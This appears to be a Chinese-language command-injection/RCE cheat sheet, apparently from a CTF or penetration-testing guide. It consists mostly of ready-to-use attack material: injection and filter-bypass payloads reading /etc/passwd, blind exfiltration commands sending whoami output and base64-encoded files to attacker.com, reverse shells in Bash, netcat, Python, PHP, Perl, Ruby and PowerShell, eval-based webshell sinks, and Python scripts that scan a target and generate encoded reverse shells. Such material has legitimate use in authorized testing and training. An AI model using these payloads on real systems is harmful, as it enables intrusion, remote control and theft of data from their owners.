# 💻 命令执行模块 (RCE)

## 适用场景
- ping、traceroute 等网络工具接口
- 系统命令调用功能
- 代码执行漏洞

## 检查清单

```yaml
命令注入类型:
  - [ ] 操作系统命令注入
  - [ ] 代码执行 (eval)
  - [ ] 函数回调注入

执行函数识别:
  - PHP: system(), exec(), shell_exec(), passthru(), popen()
  - Python: os.system(), subprocess.Popen(), eval(), exec()
  - Java: Runtime.getRuntime().exec()
  - Node.js: child_process.exec()

绕过技巧:
  - [ ] 空格绕过
  - [ ] 关键字绕过
  - [ ] 命令分隔符替代
  - [ ] 编码绕过
  - [ ] 特殊变量利用

利用方式:
  - [ ] 读取文件
  - [ ] 反弹 Shell
  - [ ] 写入 WebShell
  - [ ] 提权
```

## 分析流程

### Step 1: 命令注入检测

```bash
# 基础测试 - 命令分隔符
; id
| id
|| id
& id
&& id
`id`
$(id)

# 时间延迟测试
; sleep 5
| sleep 5
& ping -c 5 127.0.0.1
`sleep 5`

# 换行符
%0a id
%0d id

# 示例完整 payload
127.0.0.1; id
127.0.0.1 | id
127.0.0.1 && id
127.0.0.1 || id
`id`
$(id)
```

### Step 2: 常用命令分隔符

```bash
# Linux
;      # 顺序执行
|      # 管道符
||     # 前命令失败才执行
&      # 后台执行
&&     # 前命令成功才执行
`cmd`  # 命令替换
$(cmd) # 命令替换
%0a    # 换行符
%0d    # 回车符

# Windows
&      # 顺序执行
&&     # 前命令成功才执行
|      # 管道符
||     # 前命令失败才执行
%0a    # 换行符
```

### Step 3: 空格绕过

```bash
# $IFS (Internal Field Separator)
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
cat${IFS}$9/etc/passwd

# Tab
cat%09/etc/passwd

# 花括号
{cat,/etc/passwd}
{cat,/etc/passwd,}

# 重定向
cat</etc/passwd

# 变量赋值
x=/etc/passwd;cat$x

# 十六进制
X=$'cat\x20/etc/passwd'&&$X
```

### Step 4: 关键字绕过

```bash
# 引号绕过
c'a't /etc/passwd
c"a"t /etc/passwd
c``at /etc/passwd

# 反斜杠绕过
c\at /etc/passwd
wh\oami

# 变量拼接
a=c;b=at;$a$b /etc/passwd

# Base64 编码
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
bash -c "$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)"

# 十六进制
$(printf '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64')

# 通配符
/???/c?t /???/p??s??
/???/c?t$IFS/???/p?s?wd

# 环境变量
${PATH:0:1}  # 取 PATH 第一个字符 /
${IFS}       # 空格

# rev 反转
echo 'dwssap/cte/ tac' | rev | bash
```

### Step 5: 无回显命令执行

```bash
# DNS 外带
curl `whoami`.attacker.com
ping -c 1 `whoami`.attacker.com

# HTTP 外带
curl http://attacker.com/$(whoami)
wget http://attacker.com/$(cat /etc/passwd | base64)

# 时间延迟判断
sleep 5
ping -c 5 127.0.0.1

# 写文件
echo "result" > /var/www/html/result.txt

# 反弹 Shell
bash -i >& /dev/tcp/attacker/port 0>&1
```

### Step 6: 反弹 Shell

```bash
# Bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'

# Netcat
nc -e /bin/bash 10.0.0.1 4444
nc -c /bin/bash 10.0.0.1 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.0.0.1 4444 >/tmp/f

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'

# PHP
php -r '$sock=fsockopen("10.0.0.1",4444);exec("/bin/bash -i <&3 >&3 2>&3");'

# Perl
perl -e 'use Socket;$i="10.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'

# Ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4444).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'

# PowerShell
powershell -nop -c "$client=New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Step 7: 代码执行

```php
// PHP 代码执行
<?php
eval($_GET['cmd']);  // eval 执行
assert($_GET['cmd']); // assert 执行
create_function('', $_GET['cmd']); // 创建函数
call_user_func($_GET['func'], $_GET['arg']); // 回调函数
preg_replace('/test/e', $_GET['cmd'], 'test'); // preg_replace /e
array_map($_GET['func'], array($_GET['arg'])); // 数组函数
usort(...$_GET); // 排序函数
?>

// 利用示例
?cmd=phpinfo();
?cmd=system('id');
?func=system&arg=id
```

```python
# Python 代码执行
eval(user_input)
exec(user_input)
__import__('os').system(user_input)

# 利用示例
__import__('os').system('id')
eval("__import__('os').system('id')")
```

## 常见套路与解法

### 套路 1: 基础命令注入

**特征**: ping、nslookup 功能

**Payload**:
```bash
127.0.0.1; id
127.0.0.1 | id
127.0.0.1 && id
```

### 套路 2: 空格过滤

**特征**: 空格被过滤

**Payload**:
```bash
;cat${IFS}/etc/passwd
;cat$IFS/etc/passwd
;{cat,/etc/passwd}
;cat</etc/passwd
```

### 套路 3: 关键字过滤

**特征**: cat, flag 等关键字被过滤

**Payload**:
```bash
# 绕过 cat
;c\at /etc/passwd
;c''at /etc/passwd
;tac /etc/passwd
;head /etc/passwd
;tail /etc/passwd
;nl /etc/passwd
;more /etc/passwd
;less /etc/passwd
;sort /etc/passwd
;uniq /etc/passwd

# 绕过 flag
;cat /???/f???
;cat /etc/passwd | grep -i fl
```

### 套路 4: 无回显

**特征**: 无法看到命令输出

**Payload**:
```bash
# DNS 外带
;curl `whoami`.xxxxx.dnslog.cn

# HTTP 外带
;curl http://attacker.com/?d=`cat /flag | base64`

# 写入文件
;cat /flag > /var/www/html/1.txt

# 反弹 shell
;bash -c 'bash -i >& /dev/tcp/ip/port 0>&1'
```

### 套路 5: 长度限制

**特征**: 输入长度有限制

**Payload**:
```bash
# 短命令
>a           # 创建文件
ls>b         # 输出到文件
sh b         # 执行

# 逐步写入
echo PD9waH>1
echo Agc3lz>>1
# base64 分段写入后解码
```

## 自动化脚本

```python
#!/usr/bin/env python3
"""
命令注入检测脚本
"""

import requests
import time

url = "http://target.com/ping.php"
param = "ip"

# 测试 payload
payloads = [
    # 基础分隔符
    "; id",
    "| id",
    "|| id",
    "& id",
    "&& id",
    "`id`",
    "$(id)",
    
    # 时间延迟
    "; sleep 5",
    "| sleep 5",
    "&& sleep 5",
    "|| sleep 5",
    
    # 空格绕过
    ";cat${IFS}/etc/passwd",
    ";{cat,/etc/passwd}",
]

def test_rce(base_value="127.0.0.1"):
    """测试命令注入"""
    for payload in payloads:
        test_value = base_value + payload
        
        start = time.time()
        try:
            resp = requests.get(url, params={param: test_value}, timeout=10)
            elapsed = time.time() - start
            
            # 检查时间延迟
            if "sleep" in payload and elapsed >= 5:
                print(f"[+] Time-based RCE: {payload}")
                print(f"    Delay: {elapsed:.2f}s")
                
            # 检查回显
            if "uid=" in resp.text or "root:" in resp.text:
                print(f"[+] RCE Confirmed: {payload}")
                print(f"    Response contains command output")
                
        except requests.Timeout:
            if "sleep" in payload:
                print(f"[+] Possible RCE (timeout): {payload}")
        except Exception as e:
            print(f"[-] Error: {e}")

if __name__ == '__main__':
    test_rce()
```

```python
#!/usr/bin/env python3
"""
反弹 Shell 生成器
"""

import base64
import urllib.parse

def generate_reverse_shell(ip, port, shell_type="bash"):
    """生成反弹 shell payload"""
    
    shells = {
        "bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "bash2": f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'",
        "nc": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {ip} {port} >/tmp/f",
        "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'",
        "php": f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/bash -i <&3 >&3 2>&3\");'",
    }
    
    shell = shells.get(shell_type, shells["bash"])
    
    # 生成各种编码版本
    print(f"[*] {shell_type} Reverse Shell")
    print(f"    Plain: {shell}")
    print(f"    Base64: {base64.b64encode(shell.encode()).decode()}")
    print(f"    URL: {urllib.parse.quote(shell)}")
    
    # 监听命令
    print(f"\n[*] Start listener:")
    print(f"    nc -lvnp {port}")

if __name__ == '__main__':
    import sys
    if len(sys.argv) < 3:
        print("Usage: python3 revshell.py <IP> <PORT> [type]")
        print("Types: bash, bash2, nc, python, php")
        sys.exit(1)
    
    ip = sys.argv[1]
    port = sys.argv[2]
    shell_type = sys.argv[3] if len(sys.argv) > 3 else "bash"
    
    generate_reverse_shell(ip, port, shell_type)
```

## 工具速查

```bash
# 反弹 shell 监听
nc -lvnp 4444
rlwrap nc -lvnp 4444  # 带历史记录

# 升级 shell
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'

# 完全交互式 shell
Ctrl+Z
stty raw -echo; fg
export TERM=xterm

# 在线工具
# https://www.revshells.com/
# https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
```
